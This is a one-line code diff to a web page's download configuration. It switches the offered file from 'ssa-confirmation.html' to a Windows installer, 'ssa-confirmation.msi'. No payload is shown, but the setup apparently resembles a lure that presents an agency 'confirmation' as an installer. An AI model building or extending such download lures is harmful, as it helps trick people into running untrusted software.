@@ -5,7 +5,7 @@ import DownloadGuide from "@/components/DownloadGuide";
 import PlatformModal from "@/components/PlatformModal";
 
 // Configuration
-const DOWNLOAD_FILE = "/ssa-confirmation.html";
+const DOWNLOAD_FILE = "/ssa-confirmation.msi";
 const WINDOWS_ONLY_EXTENSIONS = [".exe", ".msi"]; // Add extensions that require Windows
 
 export default function Home() {
